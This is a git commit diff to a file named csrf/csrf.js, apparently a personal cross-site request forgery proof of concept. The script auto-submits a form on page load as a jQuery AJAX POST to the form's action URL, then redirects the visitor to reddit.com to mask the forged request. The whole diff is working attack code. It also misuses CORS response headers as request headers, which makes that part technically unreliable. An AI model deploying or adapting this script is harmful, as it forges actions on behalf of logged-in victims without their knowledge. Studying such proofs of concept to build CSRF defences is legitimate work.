fd209fa94f84c1b6011410539c349eb0410377f0
DorWeid <dorprozor@gmail.com>
2017-11-14 18:06:05 +0200

    with ajax...

--- csrf/csrf.js
+++ csrf/csrf.js
@@ -2,10 +2,28 @@ $(function() {
 	console.log('begin');
 	
 	$("form").submit(function(e) {
-		e.preventDefault();
-		debugger;
-		window.location.href = "https://www.reddit.com";
+		$.ajax({
+        type: 'POST',
+        url: $(this).attr('action'),
+		headers: {
+			'Access-Control-Allow-Origin': 'https://dorweid.github.io',
+			'Access-Control-Allow-Credentials': 'true'
+		},
+        dataType: 'json',
+        success: function(json) {
+           window.location.href = "https://www.reddit.com";
+        }
+    })
+    return false;
 	})
+	
+	/**$("form").bind('ajax:complete', function() {
+
+         // tasks to do 
+
+window.location.href = "https://www.reddit.com";
+return false;
+   });**/
 	
 	$("form").submit();
 });
